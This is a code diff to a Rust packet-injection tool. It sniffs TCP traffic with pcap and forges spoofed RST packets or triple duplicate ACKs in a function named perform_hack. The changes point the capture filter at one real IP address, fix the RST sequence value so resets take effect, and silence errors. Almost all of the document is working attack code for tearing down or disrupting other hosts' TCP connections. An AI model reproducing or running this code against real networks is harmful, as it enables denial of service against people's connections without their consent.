@@ -3,7 +3,8 @@ mod os;
 use crate::os::OsInfo;
 use etherparse::{EtherType, Ethernet2Header, IpNumber, Ipv4Header, PacketBuilder, TcpHeader};
 use pcap::{Active, Capture, Device};
-use std::thread;
+use std::hash::BuildHasher;
+use std::thread::{self, Builder};
 use std::thread::sleep;
 use std::time::Duration;
 
@@ -22,6 +23,7 @@ fn main() {
     let attack_type = &AttackType::RSTInjection;
 
     let mut cap = get_capture(interface.as_str());
+    let mut send_cap = get_capture(interface.as_str());
 
     // similar syntax to wireshark (BPF)
     // some examples:
@@ -29,15 +31,18 @@ fn main() {
     // no filter: empty string
     // experimental protocol: ip protochain 253
     // TCP protocol: tcp
-    let filter = "";
+    let filter = "tcp and host 80.249.99.148";
     cap.filter(filter, true).expect("filter error");
 
     println!("listening on interface {} for packets...", interface);
 
     // start sending packets in a separate thread
+
+    /* 
     thread::spawn(move || {
         test_sending_packets(interface.as_str());
     });
+    */
 
     // listen to incoming packets
     loop {
@@ -55,10 +60,11 @@ fn main() {
                             tcp_header,
                             payload,
                             attack_type,
+                            &mut send_cap
                         );
                     }
-                    Err(e) => {
-                        println!("{}", e);
+                    Err(_) => {
+                        // Suppress error prints to avoid flooding in console
                     }
                 }
             }
@@ -118,65 +124,54 @@ fn perform_hack(
     tcp_header: TcpHeader,
     payload: &[u8],
     attack_type: &AttackType,
+    send_cap: &mut Capture<Active>
 ) {
-    let interface = OsInfo::get_interface();
-    let mut cap = get_capture(interface.as_str());
+    //let interface = OsInfo::get_interface();
+    //let mut cap = get_capture(interface.as_str());
 
     //payload doesn't matter for the hacks, since we are just resetting the connection
     let payload = &[];
 
+    // Builder 
+    let builder = PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
+                                                .ipv4(ipv4_header.destination, 
+                                                    ipv4_header.source, 
+                                                    ipv4_header.time_to_live
+                                                )
+                                                .tcp(tcp_header.destination_port, 
+                                                    tcp_header.source_port, 
+                                                    tcp_header.acknowledgment_number, // used to be "tcp_header.sequence_number"
+                                                    tcp_header.window_size
+                                                );
+
     match attack_type {
         //RST injection to reset the connection
         AttackType::RSTInjection => {
-            let builder =
-                PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
-                    .ipv4(
-                        ipv4_header.destination,
-                        ipv4_header.source,
-                        ipv4_header.time_to_live,
-                    )
-                    .tcp(
-                        tcp_header.destination_port,
-                        tcp_header.source_port,
-                        tcp_header.sequence_number, // maybe ack number ?
-                        tcp_header.window_size,
-                    )
-                    .rst();
+
+            let builder = builder.rst();
 
             let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
 
             builder.write(&mut packet, payload).unwrap();
 
-            cap.sendpacket(packet.as_slice()).unwrap();
+            send_cap.sendpacket(packet.as_slice()).unwrap(); // used to just be cap
 
-            println!("RST injection done");
+            println!("RST injection sent");
         }
         AttackType::DuplicateAck => {
             let ack_number = tcp_header.sequence_number;
-            let builder =
-                PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
-                    .ipv4(
-                        ipv4_header.destination,
-                        ipv4_header.source,
-                        ipv4_header.time_to_live,
-                    )
-                    .tcp(
-                        tcp_header.destination_port,
-                        tcp_header.source_port,
-                        tcp_header.sequence_number,
-                        tcp_header.window_size,
-                    )
-                    .ack(ack_number);
+            
+            let builder = builder.ack(ack_number);
 
             let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
 
             builder.write(&mut packet, payload).unwrap();
 
-            cap.sendpacket(packet.as_slice()).unwrap();
-            cap.sendpacket(packet.as_slice()).unwrap();
-            cap.sendpacket(packet.as_slice()).unwrap();
+            send_cap.sendpacket(packet.as_slice()).unwrap();
+            send_cap.sendpacket(packet.as_slice()).unwrap();
+            send_cap.sendpacket(packet.as_slice()).unwrap();
 
-            println!("3 times ACK done");
+            println!("3 times ACK sent");
         }
     }
 }
